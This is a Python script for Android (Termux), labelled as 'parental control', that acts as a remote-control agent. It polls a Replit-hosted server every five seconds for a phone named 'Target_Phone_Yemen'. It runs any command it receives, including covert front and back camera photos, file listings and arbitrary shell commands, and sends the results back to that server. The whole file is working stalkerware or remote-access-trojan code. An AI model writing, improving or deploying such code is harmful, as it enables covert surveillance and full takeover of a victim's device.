import os
import time
import requests
import subprocess

SERVER_URL = "https://b6d8d94a-dd76-4a47-bfad-2e961828ff9e-00-53zsrme6wzlm.pike.replit.dev/api/report"
DEVICE_ID = "Target_Phone_Yemen"

def execute_parental_control(command):
    try:
        if command == "cam_front":
            subprocess.run("termux-camera-photo -c 0 /sdcard/DCIM/front_cam.jpg", shell=True)
            return "📸 تم التقاط صورة الكاميرا الأمامية وحفظها في المعرض."
        elif command == "cam_back":
            subprocess.run("termux-camera-photo -c 1 /sdcard/DCIM/back_cam.jpg", shell=True)
            return "📷 تم التقاط صورة الكاميرا الخلفية وحفظها في المعرض."
        elif command == "browse_files":
            files = "\n".join(os.listdir("/sdcard/"))[:700]
            return f"📁 محتويات الذاكرة الداخلية:\n{files}"
        elif command == "phone_settings":
            info = subprocess.check_output("getprop", shell=True).decode()[:600]
            return f"⚙️ إعدادات ومعلومات النظام:\n{info}"
        else:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
            return output
    except Exception as e:
        return f"خطأ أثناء التنفيذ: {str(e)}"

def run_agent():
    while True:
        try:
            payload = {"device_id": DEVICE_ID, "status": "active"}
            response = requests.post(SERVER_URL, json=payload, timeout=10)
            if response.status_code == 200:
                data = response.json()
                command = data.get("command", "none")
                if command != "none":
                    result_msg = execute_parental_control(command)
                    requests.post(SERVER_URL, json={"device_id": DEVICE_ID, "result": result_msg})
        except Exception:
            pass
        time.sleep(5)

if __name__ == "__main__":
    run_agent()
